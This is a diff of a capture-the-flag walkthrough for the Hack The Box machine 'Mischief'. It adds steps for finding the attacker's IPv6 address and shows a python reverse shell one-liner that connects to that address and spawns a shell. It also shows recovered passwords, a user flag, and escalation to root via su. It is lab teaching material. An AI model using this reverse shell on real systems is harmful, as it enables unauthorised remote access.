@@ -248,9 +248,17 @@ Ncat: Listening on :::1234
 
 Then, try to invoke a reverse shell.<br>
 We can use a python reverse shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>.<br>
-However, this time we have to use IPv6 and we need some modifications for that.
+<br>
+At first, we have to figure out global IPv6 address of our host
+{% highlight shell %}
+root@kali:~#  ip a | grep inet6 | grep global
+    inet6 dead:beef:2::100b/64 scope global 
 
-#### python payload:
+root@kali:~#
+{% endhighlight %}
+
+Then, give some modification for the given python payload and execute.
+#### python payload used:
 {% highlight shell %}
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100b",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");';
 {% endhighlight %}
@@ -271,7 +279,7 @@ $
 Then, try to look at the home directory of only one user "loki".<br>
 We can find a possible password "lokiisthebestnorsegod".
 {% highlight shell %}
-$ pwd     
+$ pwd
 pwd
 /home/loki
 
@@ -305,7 +313,7 @@ user.txt is in the directory of "/home/loki".
 loki@Mischief:~$ cat user.txt 
 bf58078e7b802c5f32b545eea7c90060
 
-loki@Mischief:~$ 
+loki@Mischief:~$
 {% endhighlight %}
 
 ### 3. Getting Root
@@ -333,7 +341,18 @@ exit
 loki@Mischief:~$
 {% endhighlight %}
 
-The user "loki" can't use a command "su".<br>
+
+We can find an interesting thing that user "loki" can't use a command "su" due to its permission.
+{% highlight shell %}
+loki@Mischief:~$ su root
+-bash: /bin/su: Permission denied
+
+loki@Mischief:~$ ls -l /bin/su
+-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su
+
+loki@Mischief:~$ 
+{% endhighlight %}
+
 This is because <a href="https://wiki.archlinux.org/index.php/Access_Control_Lists">Access Control List</a> doesn't allow user "loki" to execute the command.<br>
 We can confirm that with "getfacl" command.
 {% highlight shell %}
@@ -354,7 +373,7 @@ loki@Mischief:~$
 
 However, if we take a look at user "www-data", we can notice that we can run "su" command and become "root"
 {% highlight shell %}
-$ su root                     
+$ su root
 su root
 Password: lokipasswordmischieftrickery
 
@@ -362,7 +381,7 @@ root@Mischief:/home/loki# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 
-root@Mischief:/home/loki# 
+root@Mischief:/home/loki#
 {% endhighlight %}
 
 However, we don't have a correct "root.txt" in the directory "/root".
@@ -371,7 +390,7 @@ root@Mischief:/home/loki# cat /root/root.txt
 cat /root/root.txt
 The flag is not here, get a shell to find it!
 
-root@Mischief:/home/loki# 
+root@Mischief:/home/loki#
 {% endhighlight %}
 
 By running following command, we can find the correct "root.txt".
